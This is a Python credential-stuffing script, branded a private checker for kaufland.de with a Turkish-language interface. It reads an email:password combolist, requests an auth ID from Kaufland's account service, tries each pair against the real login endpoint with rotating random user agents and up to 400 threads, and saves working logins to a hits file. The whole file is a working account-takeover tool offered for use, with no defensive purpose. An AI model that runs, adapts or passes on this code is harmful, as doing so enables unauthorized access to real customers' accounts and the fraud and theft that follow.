try:
    import time
    import os
    import requests
    import threading
    import tkinter
    import json
    from tkinter import filedialog
    from colorama import Fore, init
    from fake_useragent import UserAgent
except Exception:
    print("\n  [𝐒𝐘𝐒𝐓𝐄𝐌] ~ [♥] 𝐆𝐨𝐫𝐮𝐧𝐮𝐬𝐞 𝐆𝐨𝐫𝐞 𝐌𝐨𝐝𝐮𝐥𝐥𝐞𝐫𝐢𝐧𝐢𝐳 𝐄𝐤𝐬𝐢𝐤. 𝐀𝐜𝐚𝐛𝐚 𝐇𝐚𝐧𝐠𝐢𝐬𝐢, 𝐒𝐨𝐲𝐥𝐞𝐦𝐞𝐦. :)")
    time.sleep(2)

root = tkinter.Tk()
root.withdraw()

init()

print(Fore.MAGENTA)
banner = """
   ██╗  ██╗██╗     ███████╗██╗███╗   ██╗████████╗██╗████████╗██████╗  █████╗ 
   ██║ ██╔╝██║     ██╔════╝██║████╗  ██║╚══██╔══╝██║╚══██╔══╝██╔══██╗██╔══██╗
   █████╔╝ ██║     █████╗  ██║██╔██╗ ██║   ██║   ██║   ██║   ██████╔╝███████║
   ██╔═██╗ ██║     ██╔══╝  ██║██║╚██╗██║   ██║   ██║   ██║   ██╔══██╗██╔══██║
   ██║  ██╗███████╗███████╗██║██║ ╚████║   ██║   ██║   ██║   ██║  ██║██║  ██║
				         𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫: [𝐃𝐞𝐟𝐚𝐜𝐞𝐑]𝐌𝐫𝐗 ..!
				      ~~ 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐤𝐚𝐮𝐟𝐥𝐚𝐧𝐝.𝐝𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ~~ """
print(banner)

global email
global password
num = 0
ua = UserAgent()
email = []
password = []
invalid = 0
hesap = 0
retry = 0

print()
Thread = int(input(' ~ [?] {𝗠𝗮𝘅 𝟰𝟬𝟬 𝗕𝗼𝘁} 𝗕𝗼𝘁 𝗛𝗶𝘇𝗶: '))

if Thread > 400:
    print(Fore.RED)
    print(" ~ [!] 𝗠𝗮𝘅 𝗧𝗵𝗿𝗲𝗮𝗱 𝟰𝟬𝟬'𝗱𝘂𝗿!")
    time.sleep(2)
    exit()
else:
    pass

def menu_design():
    global invalid
    global hesap
    global num
    global password
    global retry
    print(Fore.CYAN)
    print(banner)
    print(Fore.CYAN + '                        𝗖𝗵𝗲𝗰𝗸𝗲𝗱:         ' + str(hesap + invalid))
    print(Fore.CYAN + '                        𝐈𝐧𝐯𝐚𝐥𝐢𝐝:          ' + str(invalid))
    print(Fore.CYAN + '                        𝐇𝐢𝐭𝐬:            ' + str(hesap))
    print(Fore.CYAN + '                        𝐑𝐞𝐭𝐫𝐲:           ' + str(retry))
    print(Fore.CYAN + '                        𝐂𝐏𝐌:            ' + str(num*60))
    print()
    time.sleep(3)
    threading.Thread(target=menu_design, args=(), ).start()

try:
    klasor = os.makedirs('kaufland_Hitleri')
except FileExistsError:
    print(Fore.LIGHTBLUE_EX)
    print(" ~ [♥] 𝐃𝐚𝐡𝐚 𝐨𝐧𝐜𝐞𝐤𝐢 𝐇𝐢𝐭 𝐤𝐥𝐚𝐬𝐨𝐫𝐮𝐧𝐮𝐳𝐮 𝐬𝐢𝐥𝐢𝐩 𝐭𝐞𝐤𝐫𝐚𝐫 𝐝𝐞𝐧𝐞𝐲𝐢𝐧𝐢𝐳.")
    time.sleep(2)
    exit()

class load_combos:
    global email, password, num, invalid, hesap, retry

    print('\n')
    print(f" {Fore.LIGHTCYAN_EX} ~ [?] 𝐂𝐨𝐦𝐛𝐨𝐥𝐢𝐬𝐭'𝐢 𝐒𝐞𝐜𝐦𝐞𝐤 𝐢𝐜𝐢𝐧 𝐄𝐍𝐓𝐄𝐑'𝐞 𝐁𝐚𝐬..")
    input()

    fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='𝐂𝐨𝐦𝐛𝐨𝐥𝐢𝐬𝐭 𝐃𝐨𝐬𝐲𝐚𝐬𝐢𝐧𝐢 𝐒𝐞𝐜!',
                                       filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameCombo is None:
        print()
        print(f" {Fore.LIGHTRED_EX} [!] 𝐃𝐨𝐠𝐫𝐮 𝐂𝐨𝐦𝐛𝐨𝐥𝐢𝐬𝐭'𝐢 𝐒𝐞𝐜.")
    else:
        print(Fore.LIGHTCYAN_EX)
        hawli = print(" ~ 𝐂𝐨𝐦𝐛𝐨𝐥𝐢𝐬𝐭 𝐘𝐮𝐤𝐥𝐞𝐧𝐢𝐲𝐨𝐫..\n")
        time.sleep(1)
        hawli = print(" ~ 𝐂𝐨𝐦𝐛𝐨𝐥𝐢𝐬𝐭 𝐘𝐮𝐤𝐥𝐞𝐧𝐝𝐢, 𝐓𝐚𝐫𝐚𝐦𝐚 𝐁𝐚𝐬𝐥𝐚𝐭𝐢𝐥𝐢𝐲𝐨𝐫...")
        time.sleep(2)
        os.system('cls')
        print(Fore.MAGENTA)
        print("\n" + banner + "\n")
        print()
        with open(fileNameCombo.name, 'r', encoding='utf-8') as e:
            ext = e.readlines()
            for line in ext:
                email = line.split(":")[0].replace('\n', '')
                password = line.split(":")[1].replace('\n', '')
                capture = email + ":" + password

                datass = {
                    "client_id": "3e751c8f-f4e0-499b-81cc-8222e5f61729",
                    "redirect_uri": "https://www.kaufland.de/iam/success",
                    "scope": "profile email offline_access openid",
                    "response_type": "code",
                    "state": "eyJzIjoiLyJ9"
                }

                x = requests.post('https://account.kaufland.com/authz-srv/authrequest/authz/generate', json=datass).text

                y = json.loads(x)

                reqid = y["data"]["requestId"]

                datas = {
                    "email": email,
                    "username": email,
                    "username_type": "email",
                    "password": password,
                    "requestId": reqid,
                    "rememberMe": "true"
                }

                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "user-agent": ua.random,
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Host": "account.kaufland.com",
                    "Origin": "https://www.kaufland.de",
                    "Referer": "https://www.kaufland.de/",
                    "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
                }

                r = requests.post('https://account.kaufland.com/login-srv/login', data=datas, headers=headers, allow_redirects=False)

                if "https://www.kaufland.de/iam/success" in r.text:
                    num += 1
                    hesap += 1
                    print(f'{Fore.LIGHTMAGENTA_EX} ~ [HIT] ' + capture)
                    hits = open("kaufland_Hitleri/Hits.txt", "a+").write("{}:{}\n".format(email, password))
                elif "https://www.kaufland.de/iam/login?groupname=marketplace" in r.text:
                    num += 1
                    invalid += 1
                    print(f'{Fore.LIGHTRED_EX} ~ [BAD] ' + capture)
                elif "Error occured during login, please try again!!" in r.text:
                    num += 1
                    retry += 1
                elif "Proxy Error" in r.text:
                    num += 1
                    retry += 1
                elif "Login successful!!!" in r.text:
                    num += 1
                    retry += 1
menu_design()

while True:
    if threading.active_count() <= 400:
        try:
            threading.Thread(target=load_combos, args=(email[num],password[num],)).start()
            num += 1
        except:
            pass